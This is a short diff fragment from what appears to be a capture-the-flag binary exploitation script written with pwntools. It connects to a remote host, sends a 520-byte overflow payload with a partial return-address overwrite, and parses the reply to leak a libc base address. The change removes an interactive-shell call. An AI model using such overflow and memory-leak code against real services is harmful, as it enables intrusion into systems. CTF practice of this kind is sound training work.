@@ -228,7 +228,6 @@ libc  = ELF("./libc.so.6")
 r = remote("52.59.124.14",10034)
 exploit = b"A" * 520 + p8(0xc3)
 r.send(exploit)
-r.interactive()
 r.recvuntil(b"A" * 520)
 leak = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00')) - 0x271c3
 print(hex(leak))
